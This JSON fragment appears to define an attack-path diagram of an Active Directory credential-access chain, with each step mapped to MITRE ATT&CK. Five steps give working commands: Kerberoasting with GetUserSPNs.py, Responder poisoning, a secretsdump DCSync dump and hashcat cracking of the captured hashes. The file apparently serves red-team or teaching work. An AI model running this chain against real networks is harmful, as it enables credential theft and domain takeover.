  "steps": [
    {
      "id": 1,
      "type": "edge",
      "name": "Request Kerberos Service Tickets",
      "from": "domain_controller_kdc",
      "to": "captured_artifact_pool",
      "icon": "IconTicket",
      "cli": "GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast",
      "description": "Collect TGS material for SPN-bearing accounts to seed Kerberoast cracking workflows.",
      "mitre": {
        "id": "T1558.003",
        "tactic": "Credential Access",
        "technique": "Kerberoasting"
      }
    },
    {
      "id": 2,
      "type": "edge",
      "name": "Capture Additional Auth Artifacts",
      "from": "service_account_set",
      "to": "responder_capture",
      "icon": "IconNetwork",
      "cli": "sudo python3 Responder.py -I eth0 -v",
      "description": "Expand artifact coverage with relay/poisoning-driven captures from additional auth protocols.",
      "mitre": {
        "id": "T1557.001",
        "tactic": "Credential Access",
        "technique": "LLMNR/NBT-NS Poisoning and SMB Relay"
      }
    },
    {
      "id": 3,
      "type": "edge",
      "name": "Dump Domain Replication Material",
      "from": "ntds_store",
      "to": "captured_artifact_pool",
      "icon": "IconDownload",
      "cli": "secretsdump.py -just-dc -outputfile dc_dump <DOMAIN>/<USER>:<PASS>@<DC_IP>",
      "description": "Use replication abuse path to pull domain-scale credential material into the shared artifact pool.",
      "mitre": {
        "id": "T1003.006",
        "tactic": "Credential Access",
        "technique": "DCSync"
      }
    },
    {
      "id": 4,
      "type": "edge",
      "name": "Route Artifacts to Matching Crack Modes",
      "from": "captured_artifact_pool",
      "to": "cracking_farm",
      "icon": "IconProcess",
      "cli": "hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt",
      "description": "Dispatch each artifact family to mode-aligned cracking commands for throughput and parser correctness.",
      "mitre": {
        "id": "T1110.002",
        "tactic": "Credential Access",
        "technique": "Password Cracking"
      }
    },
    {
      "id": 5,
      "type": "edge",
      "name": "Recover Credentials from Crack Outputs",
      "from": "cracking_farm",
      "to": "recovered_credentials",
      "icon": "IconStolenCredential",
      "cli": "hashcat -m 1000 dc_dump.ntds /usr/share/wordlists/rockyou.txt",
      "description": "Aggregate successful crack outcomes across ticket, challenge-response, and NTDS-derived inputs.",
      "mitre": {
        "id": "T1110.002",
        "tactic": "Credential Access",
        "technique": "Password Cracking"
      }
    },
    {
      "id": 6,
      "type": "edge",
      "name": "Consolidate Valid Account Access",
      "from": "recovered_credentials",
      "to": "operator_node",
      "icon": "IconCheck",
      "description": "Recovered credential set is consolidated for controlled access validation and escalation testing.",
      "mitre": {
        "id": "T1078",
        "tactic": "Initial Access",
        "technique": "Valid Accounts"
      }
    }
  ],
